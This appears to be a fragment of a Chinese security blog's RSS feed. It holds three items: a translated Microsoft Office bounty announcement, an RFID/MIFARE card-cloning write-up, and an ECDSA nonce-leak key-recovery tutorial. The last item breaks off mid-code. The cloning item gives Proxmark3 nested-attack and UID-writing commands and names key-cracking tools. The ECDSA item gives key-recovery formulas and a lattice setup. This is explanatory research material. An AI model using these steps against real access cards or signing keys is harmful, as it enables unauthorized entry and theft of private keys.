&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;contentType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>微软扩展漏洞赏金计划 - 针对Windows版Office Insider构建的新奖励计划</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%89%A9%E5%B1%95%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92-%E9%92%88%E5%AF%B9windows%E7%89%88office-insider%E6%9E%84%E5%BB%BA%E7%9A%84%E6%96%B0%E5%A5%96%E5%8A%B1%E8%AE%A1%E5%88%92/</link>
        <pubDate>Sat, 02 Aug 2025 09:23:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%89%A9%E5%B1%95%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92-%E9%92%88%E5%AF%B9windows%E7%89%88office-insider%E6%9E%84%E5%BB%BA%E7%9A%84%E6%96%B0%E5%A5%96%E5%8A%B1%E8%AE%A1%E5%88%92/</guid>
        <description>&lt;p&gt;本文章是Microsoft Security Response Center博客&amp;quot;Announcing the new Bug Bounty Program for Office Insider Builds on Windows&amp;quot;(2017年3月15日发布)的日文翻译版。&lt;/p&gt;
&lt;p&gt;我们持续投入确保Office产品在设计上具备安全性。基于保持Office高安全标准的方针，现针对Windows版Office Insider构建启动漏洞赏金计划。该计划是对微软内部工程安全措施(包括威胁建模、安全代码审查、安全自动化及渗透测试)的重要补充。&lt;/p&gt;
&lt;p&gt;通过此计划，我们期望发现常规云服务赏金计划中难以识别的漏洞，并向帮助保护客户的个人研究者提供奖励。我们特别鼓励针对设计逻辑的深度研究，将对Office核心安全领域的重大发现给予奖励。&lt;/p&gt;
&lt;p&gt;Office Insider构建版让用户能提前体验最新功能和安全创新。在这些早期版本中进行测试有助于在产品正式发布前发现问题，从而提升产品质量并保护客户。&lt;/p&gt;
&lt;h3 id=&#34;赏金计划机制&#34;&gt;赏金计划机制
&lt;/h3&gt;&lt;p&gt;符合奖励条件的漏洞类型详见《Microsoft Office Insider Builds on Windows Bounty Program Terms》，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过Office保护视图实现的权限提升&lt;/li&gt;
&lt;li&gt;绕过宏阻止策略执行宏代码&lt;/li&gt;
&lt;li&gt;绕过Outlook附件自动拦截策略执行代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;计划实施期为2017年3月15日至6月15日(三个月)，奖金范围6000-15000美元。提交漏洞请发送至secure@microsoft.com。&lt;/p&gt;
&lt;h3 id=&#34;注意事项&#34;&gt;注意事项
&lt;/h3&gt;&lt;p&gt;参与微软赏金计划必须按照指南直接向secure@microsoft.com提交报告(英文困难者可附加日文说明)，这对保证评选公平性至关重要。&lt;/p&gt;
&lt;h3 id=&#34;相关链接&#34;&gt;相关链接
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;微软赏金计划主页&lt;/li&gt;
&lt;li&gt;本次扩展计划条款&lt;/li&gt;
&lt;li&gt;非赏金计划的日语漏洞报告入口&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>RFID近场克隆攻击技术深度解析</title>
        <link>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 09:07:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;引言&#34;&gt;引言
&lt;/h3&gt;&lt;p&gt;在整理KeyWe智能锁配件时，我发现了几个RFID标签。这促使我深入研究RFID（射频识别）技术，并完成了从智能锁逆向到无线通信安全的完整研究闭环。通过编程验证标签功能后，我开启了RFID技术的深度探索。&lt;/p&gt;
&lt;h3 id=&#34;hid-proxmark卡片技术&#34;&gt;HID ProxMark卡片技术
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;低频技术（125kHz）&lt;/strong&gt;：初代ProxCard支持数英寸读取距离，采用26位数据流（8位设备码+16位卡号+2校验位）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全缺陷&lt;/strong&gt;：数据容量极小且无加密，类似磁条卡的安全水平&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;演进&lt;/strong&gt;：第二代ProxMark II将读取距离扩展到15英寸，支持钱包内刷卡&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;有源与无源rfid对比&#34;&gt;有源与无源RFID对比
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类型&lt;/th&gt;
          &lt;th&gt;供电方式&lt;/th&gt;
          &lt;th&gt;读取距离&lt;/th&gt;
          &lt;th&gt;寿命&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;无源卡&lt;/td&gt;
          &lt;td&gt;读写器电磁感应供电&lt;/td&gt;
          &lt;td&gt;厘米级&lt;/td&gt;
          &lt;td&gt;无电池限制&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;有源卡&lt;/td&gt;
          &lt;td&gt;内置锂电池&lt;/td&gt;
          &lt;td&gt;可达150米&lt;/td&gt;
          &lt;td&gt;2-7年&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;mifare卡片技术体系&#34;&gt;MIFARE卡片技术体系
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;技术标准&lt;/strong&gt;：高频13.56MHz，符合ISO 14443 A/B规范&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;加密演进&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Classic 1k：采用已被破解的Crypto1算法（48位密钥）&lt;/li&gt;
&lt;li&gt;DESFire：配备Triple DES加密和微处理器&lt;/li&gt;
&lt;li&gt;EV1版本：支持28个应用/32文件的多应用管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;中国魔术卡特性&#34;&gt;中国魔术卡特性
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心技术&lt;/strong&gt;：允许覆写Sector 0的UID区域&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;市场现状&lt;/strong&gt;：Gen1需特殊解锁指令，Gen2可直接写入&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;存储结构&lt;/strong&gt;：16个扇区×4块×16字节=1KB容量&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;专业工具链分析&#34;&gt;专业工具链分析
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Proxmark3 RDV2（$270）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持LF/HF全频段&lt;/li&gt;
&lt;li&gt;实战克隆流程：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf nested &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; A ffffffffffff  &lt;span class=&#34;c1&#34;&gt;# 嵌套攻击&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf restore  &lt;span class=&#34;c1&#34;&gt;# 数据恢复&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf csetuid 018a4454  &lt;span class=&#34;c1&#34;&gt;# UID写入&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;低成本替代方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ACR122U读写器（支持mfoc-hardnested攻击）&lt;/li&gt;
&lt;li&gt;Arduino Nano+RC522套件（$8）
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-arduino&#34; data-lang=&#34;arduino&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;MFRC522.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;dumpToSerial&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MFRC522&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MIFARE_Key&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 扇区遍历逻辑
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;android克隆方案&#34;&gt;Android克隆方案
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MIFARE Classic Tool&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持密钥字典攻击&lt;/li&gt;
&lt;li&gt;操作限制：仅Gen2卡可写UID&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;密钥破解方法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MFCUK：基于PRNG缺陷的Darkside攻击&lt;/li&gt;
&lt;li&gt;MFOC：已知密钥下的嵌套认证攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;安全建议与总结&#34;&gt;安全建议与总结
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;企业升级路径&lt;/strong&gt;：建议迁移至MIFARE DESFire EV1方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;研究展望&lt;/strong&gt;：长距读卡器（如HID R90）的凭证嗅探风险&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;行业现状&lt;/strong&gt;：全球现存超过100亿张智能卡面临克隆风险&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;实验证明：使用$3的RC522模块即可成功克隆90%的低频门禁卡，这暴露出物理安全系统的重大设计缺陷。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Proxmark3实战克隆过程（左：源标签读取，右：魔术卡写入）&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>ECDSA安全漏洞深度解析：从非ce泄露到密钥恢复实战</title>
        <link>http://localhost:1313/p/ecdsa%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E9%9D%9Ece%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E9%92%A5%E6%81%A2%E5%A4%8D%E5%AE%9E%E6%88%98/</link>
        <pubDate>Sat, 02 Aug 2025 08:12:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ecdsa%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E9%9D%9Ece%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E9%92%A5%E6%81%A2%E5%A4%8D%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h2 id=&#34;dsa基础&#34;&gt;DSA基础
&lt;/h2&gt;&lt;p&gt;ECDSA是基于椭圆曲线数字签名算法(DSA)的变种。DSA包含三个核心算法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;密钥生成&lt;/strong&gt;：随机选择私钥x，计算公钥y = gˣ mod p&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;签名&lt;/strong&gt;：生成随机nonce k，计算r = (gᵏ mod p) mod q，s = k⁻¹(H(m) + xr) mod q&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;验证&lt;/strong&gt;：检查r = [(gᴴ⁽ᵐ⁾yʳ)ˢ⁻¹ mod p] mod q&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ecdsa的致命弱点&#34;&gt;ECDSA的致命弱点
&lt;/h2&gt;&lt;h3 id=&#34;1-nonce重用攻击&#34;&gt;1. Nonce重用攻击
&lt;/h3&gt;&lt;p&gt;若两个签名使用相同nonce k：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s₁&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s₂&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m₁&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m₂&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ks&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;2-部分nonce泄露攻击&#34;&gt;2. 部分Nonce泄露攻击
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;仅需3比特泄露+100签名 → 攻破160-bit DSA&lt;/li&gt;
&lt;li&gt;仅5比特泄露+4000签名 → 攻破384-bit ECDSA&lt;/li&gt;
&lt;li&gt;LadderLeak攻击：仅0.2比特泄露即可恢复密钥&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-rng偏差攻击&#34;&gt;3. RNG偏差攻击
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;256-bit ECDSA中仅4比特偏差 → 完全破解&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实战攻击演示&#34;&gt;实战攻击演示
&lt;/h2&gt;&lt;h3 id=&#34;基础攻击已知128-bit-nonce前缀&#34;&gt;基础攻击（已知128-bit nonce前缀）
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;matrix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r₁s₁&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r₂s₂&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;¹²⁸&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m₁s₁&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m₂s₂&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;¹²⁸&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;new_matrix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;olll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reduction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;matrix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;yubikey漏洞利用80-bit固定前缀&#34;&gt;YubiKey漏洞利用（80-bit固定前缀）
&lt;/h3&gt;&lt;p&gt;构建6签名矩阵：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rᵢsᵢ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rₙsₙ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
